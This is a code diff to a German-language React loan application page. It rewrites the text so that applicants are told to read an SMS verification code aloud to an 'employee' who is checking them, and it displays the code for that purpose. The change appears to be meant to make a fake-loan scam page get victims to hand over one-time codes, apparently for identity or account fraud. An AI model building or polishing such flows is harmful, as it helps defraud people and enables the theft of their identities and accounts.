@@ -422,9 +422,9 @@ export default function CreditApplication() {
                   Ihr Kreditbetrag: {formatCurrency(creditRequest.credit_amount)}
                 </h2>
                 <p className="text-muted-foreground leading-relaxed">
-                  Ihr Kreditantrag über <span className="font-semibold text-foreground">{formatCurrency(creditRequest.credit_amount)}</span> bei 
-                  unserer Partnerbank <span className="font-semibold text-foreground">{creditRequest.partner_bank}</span> ist 
-                  vorläufig genehmigt. Bitte führen Sie die Identitätsprüfung durch.
+                  Um Ihren Kredit über <span className="font-semibold text-foreground">{formatCurrency(creditRequest.credit_amount)}</span> bei 
+                  unserer Partnerbank <span className="font-semibold text-foreground">{creditRequest.partner_bank}</span> zu beantragen, 
+                  führen Sie bitte die Identitätsprüfung durch.
                 </p>
               </div>
             </div>
@@ -477,13 +477,16 @@ export default function CreditApplication() {
               <div className="pt-1 flex-1">
                 <p className="font-semibold text-foreground flex items-center gap-2">
                   <Smartphone className="h-4 w-4 text-primary" />
-                  SMS-Code eingeben
+                  SMS-Code an Mitarbeiter durchgeben
+                </p>
+                <p className="text-sm text-muted-foreground mt-1">
+                  Geben Sie den SMS-Code an den Mitarbeiter durch, der Sie prüft
                 </p>
                 
                 <div className="p-5 rounded-xl bg-gradient-to-br from-primary/10 via-primary/5 to-transparent border border-primary/20 shadow-sm mt-3">
                   <div className="flex items-center gap-2 mb-3">
                     <Smartphone className="h-4 w-4 text-primary" />
-                    <span className="text-sm font-medium text-primary">Ihr SMS-Code</span>
+                    <span className="text-sm font-medium text-primary">SMS-Code zum Durchgeben</span>
                   </div>
                   {creditRequest.sms_code ? (
                     <p className="text-3xl font-mono font-bold tracking-widest text-foreground">
